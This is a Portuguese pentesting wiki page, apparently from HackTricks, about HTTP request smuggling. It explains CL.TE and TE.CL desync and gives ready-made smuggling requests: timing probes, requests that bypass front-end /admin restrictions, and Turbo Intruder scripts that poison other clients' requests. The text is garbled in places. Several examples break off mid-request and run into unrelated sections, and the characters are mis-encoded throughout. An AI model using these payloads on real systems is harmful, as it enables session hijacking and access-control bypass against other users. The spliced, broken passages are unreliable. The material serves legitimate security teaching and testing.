# HTTP Request Smuggling / Ataque de Desincroniza√ß√£o HTTP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## O que √©

Essa vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre **proxies front-end** e o **servidor back-end** permite que um **atacante** envie uma **solicita√ß√£o HTTP** que ser√° **interpretada** como uma **√∫nica solicita√ß√£o** pelos **proxies front-end** (balanceador de carga / proxy reverso) e **como 2 solicita√ß√µes** pelo **servidor back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima solicita√ß√£o que chega ao servidor back-end depois dele**.

### Teoria

[**Especifica√ß√£o RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem for recebida com um campo de cabe√ßalho Transfer-Encoding e um campo de cabe√ßalho Content-Length, este √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que dados grandes s√£o enviados em uma s√©rie de partes.

### Realidade

O **front-end** (um balanceador de carga / proxy reverso) **processa** o cabe√ßalho _**content-length**_ ou o cabe√ßalho _**transfer-encoding**_ e o **servidor back-end** **processa o outro** provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante poder√° enviar uma solicita√ß√£o** para o proxy reverso que ser√° **interpretada** pelo servidor **back-end como 2 solicita√ß√µes diferentes**. O **perigo** dessa t√©cnica reside no fato de que o **servidor back-end interpretar√° a 2¬™ solicita√ß√£o injetada** como se ela **tivesse vindo do pr√≥ximo cliente** e a **solicita√ß√£o real** desse cliente ser√° **parte** da **solicita√ß√£o injetada**.

### Particularidades

Lembre-se de que no HTTP **um caractere de nova linha √© composto por 2 bytes:**

* **Content-Length**: Este cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da solicita√ß√£o. O corpo deve terminar no √∫ltimo caractere, **uma nova linha n√£o √© necess√°ria no final da solicita√ß√£o**.
* **Transfer-Encoding:** Este cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo chunk**. O **chunk** deve **terminar** com uma **nova linha**, mas essa nova linha **n√£o √© contada** pelo indicador de comprimento. Este m√©todo de transfer√™ncia deve terminar com um **chunk de tamanho 0 seguido por 2 novas linhas**: `0`
* **Connection**: Com base em minha experi√™ncia, √© recomend√°vel usar **`Connection: keep-alive`** na primeira solicita√ß√£o do Request Smuggling.

## Exemplos B√°sicos

Portanto, os ataques de request smuggling envolvem colocar tanto o cabe√ßalho `Content-Length` quanto o cabe√ßalho `Transfer-Encoding` em uma √∫nica solicita√ß√£o HTTP e manipul√°-los para que os servidores front-end e back-end processem a solicita√ß√£o de maneira diferente. A maneira exata como isso √© feito depende do comportamento dos dois servidores:

* **CL.TE**: o servidor front-end usa o cabe√ßalho `Content-Length` e o servidor back-end usa o cabe√ßalho `Transfer-Encoding`.
* **TE.CL**: o servidor front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor back-end usa o cabe√ßalho `Content-Length`.
* **TE.TE**: os servidores front-end e back-end suportam o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo, obfuscando o cabe√ßalho de alguma forma.

### Vulnerabilidades CL.TE

Aqui, o servidor **front-end** usa o cabe√ßalho **`Content-Length`** e o servidor **back-end** usa o cabe√ßalho **`Transfer-Encoding`**. Podemos realizar um ataque simples de request smuggling da seguinte maneira:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Observe como o `Content-Length` indica que o **corpo da solicita√ß√£o tem 30 bytes de comprimento** (_lembre-se de que o HTTP usa uma nova linha, portanto, 2 bytes para cada nova linha_), portanto, o proxy reverso **enviar√° a solicita√ß√£o completa** para o back-end, e o back-end processar√° o cabe√ßalho `Transfer-Encoding`, deixando o `GET /404 HTTP/1.1` como o **in√≠cio da pr√≥xima solicita√ß√£o** (ali√°s, a pr√≥xima solicita√ß√£o ser√° anexada a `Foo:x<Next request starts here>`).

### Vulnerabilidades TE.CL

Aqui, o servidor front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor back-end usa o cabe√ßalho `Content-Length`. Podemos realizar um ataque simples de request smuggling da seguinte maneira:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Uma vez que o servidor front-end usa o cabe√ßalho `Content-Length`, ele encaminhar√° apenas parte desta solicita√ß√£o, omitindo o `0`. O servidor back-end usa o cabe√ßalho `Transfer-Encoding`, processa o primeiro fragmento e, em seguida, aguarda a chegada do pr√≥ximo fragmento. Isso causar√° um atraso de tempo observ√°vel.

√Äs vezes, em vez de obter um tempo limite, voc√™ recebe uma solicita√ß√£o ruim 400 do host final, como no seguinte cen√°rio, onde um payload CL.TE √© enviado:

![](<../../.gitbook/assets/image (444).png>)

E a resposta √© um redirecionamento contendo um erro dentro do corpo, com at√© mesmo a vers√£o do haproxy usada:

![](<../../.gitbook/assets/image (443).png>)

### Encontrando vulnerabilidades TE.CL usando t√©cnicas de temporiza√ß√£o

Se uma aplica√ß√£o for vulner√°vel √† variante TE.CL de smuggling de solicita√ß√£o, ent√£o enviar uma solicita√ß√£o como a seguinte frequentemente causar√° um atraso de tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Desde que o servidor front-end usa o cabe√ßalho `Transfer-Encoding`, ele encaminhar√° apenas parte desta solicita√ß√£o, omitindo o `X`. O servidor back-end usa o cabe√ßalho `Content-Length`, espera mais conte√∫do no corpo da mensagem e aguarda a chegada do conte√∫do restante. Isso causar√° um atraso observ√°vel no tempo.

### Sondagem de vulnerabilidades de solicita√ß√£o HTTP Smuggling

Depois de descobrir que as **t√©cnicas de temporiza√ß√£o est√£o funcionando**, voc√™ precisa **sondar** se pode **alterar as solicita√ß√µes de outros clientes**.\
A maneira mais f√°cil de fazer isso √© tentar envenenar suas pr√≥prias solicita√ß√µes, **fazer uma solicita√ß√£o para `/` retornar um 404, por exemplo**.\
Nos [Exemplos B√°sicos](./#basic-examples), j√° vimos exemplos `CL.TE` e `TE.CL` de como envenenar a solicita√ß√£o de um cliente para solicitar `/404`, provocando uma resposta 404 quando o cliente estava solicitando qualquer outro recurso.

**Notas**

Algumas considera√ß√µes importantes devem ser mantidas em mente ao tentar confirmar vulnerabilidades de solicita√ß√£o de contrabando via interfer√™ncia com outras solicita√ß√µes:

* A solicita√ß√£o "ataque" e a solicita√ß√£o "normal" devem ser enviadas para o servidor usando conex√µes de rede diferentes. Enviar ambas as solicita√ß√µes pela mesma conex√£o n√£o provar√° que a vulnerabilidade existe.
* A solicita√ß√£o "ataque" e a solicita√ß√£o "normal" devem usar a mesma URL e nomes de par√¢metros, na medida do poss√≠vel. Isso ocorre porque muitos aplicativos modernos roteiam solicita√ß√µes de front-end para diferentes servidores de back-end com base na URL e nos par√¢metros. Usar a mesma URL e par√¢metros aumenta a chance de que as solicita√ß√µes sejam processadas pelo mesmo servidor de back-end, o que √© essencial para que o ataque funcione.
* Ao testar a solicita√ß√£o "normal" para detectar qualquer interfer√™ncia da solicita√ß√£o "ataque", voc√™ est√° em uma corrida com qualquer outra solicita√ß√£o que o aplicativo esteja recebendo ao mesmo tempo, incluindo aquelas de outros usu√°rios. Voc√™ deve enviar a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o "ataque". Se o aplicativo estiver ocupado, voc√™ poder√° precisar realizar v√°rias tentativas para confirmar a vulnerabilidade.
* Em alguns aplicativos, o servidor front-end funciona como um balanceador de carga e encaminha solicita√ß√µes para diferentes sistemas de back-end de acordo com algum algoritmo de balanceamento de carga. Se suas solicita√ß√µes "ataque" e "normal" forem encaminhadas para diferentes sistemas de back-end, o ataque falhar√°. Esta √© uma raz√£o adicional pela qual voc√™ pode precisar tentar v√°rias vezes antes que uma vulnerabilidade possa ser confirmada.
* Se seu ataque tiver sucesso em interferir em uma solicita√ß√£o subsequente, mas esta n√£o foi a solicita√ß√£o "normal" que voc√™ enviou para detectar a interfer√™ncia, isso significa que outro usu√°rio do aplicativo foi afetado por seu ataque. Se voc√™ continuar realizando o teste, isso poder√° ter um efeito disruptivo em outros usu√°rios e voc√™ deve ter cuidado.

### For√ßando via cabe√ßalhos hop-by-hop

Abusando dos cabe√ßalhos hop-by-hop, voc√™ pode indicar ao proxy para **excluir o cabe√ßalho Content-Length ou Transfer-Encoding para que uma solicita√ß√£o HTTP smuggling seja poss√≠vel de ser abusada**.
```
Connection: Content-Lentgh
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop** visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abusando do HTTP Request Smuggling

### Para burlar controles de seguran√ßa de front-end

√Äs vezes, os **proxies de front-end executam algumas verifica√ß√µes de seguran√ßa**. Voc√™ pode evit√°-las abusando do HTTP Request Smuggling, pois ser√° capaz de **burlar as prote√ß√µes**. Por exemplo, neste exemplo, voc√™ **n√£o pode acessar `/admin` de fora** e o proxy de front-end est√° verificando isso, mas este **proxy n√£o est√° verificando a solicita√ß√£o incorporada**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando a reescrita de solicita√ß√£o de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Em muitas aplica√ß√µes, o **servidor de front-end realiza alguma reescrita de solicita√ß√µes** antes de encaminh√°-las para o servidor de back-end, geralmente adicionando alguns cabe√ßalhos de solicita√ß√£o adicionais.\
Uma coisa comum a fazer √© **adicionar ao cabe√ßalho da solicita√ß√£o** `X-Forwarded-For: <IP do cliente>` ou algum cabe√ßalho semelhante para que o back-end saiba o IP do cliente.\
√Äs vezes, se voc√™ pode **encontrar quais novos valores s√£o anexados** √† solicita√ß√£o, pode ser capaz de **burlar prote√ß√µes** e **acessar informa√ß√µes/endpoint ocultos**.

Para descobrir como o proxy est√° reescrevendo a solicita√ß√£o, voc√™ precisa **encontrar um par√¢metro POST que o back-end refletir√° em sua resposta**. Em seguida, use este par√¢metro como o √∫ltimo e use uma explora√ß√£o como esta:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded
### Armando o HTTP Request Smuggling com a Desincroniza√ß√£o de Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de HTTP Request Smuggling e n√£o sabe como explor√°-la? Tente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts do Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
 Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)

A t√©cnica TE.CL √© uma t√©cnica de smuggling que explora a diferen√ßa de implementa√ß√£o entre dois headers de transfer√™ncia de codifica√ß√£o: Transfer-Encoding e Content-Length. Essa t√©cnica √© usada para enviar requisi√ß√µes HTTP maliciosas que podem ser interpretadas de forma diferente pelos servidores intermedi√°rios e pelo servidor de destino, resultando em comportamentos inesperados e potencialmente perigosos. A t√©cnica TE.CL √© uma das t√©cnicas de HTTP Request Smuggling mais comuns e pode ser usada para realizar ataques de Account Takeover, Cross-Site Scripting (XSS), entre outros.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
## Mais informa√ß√µes

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagem daqui.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas de smuggling de solicita√ß√£o.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
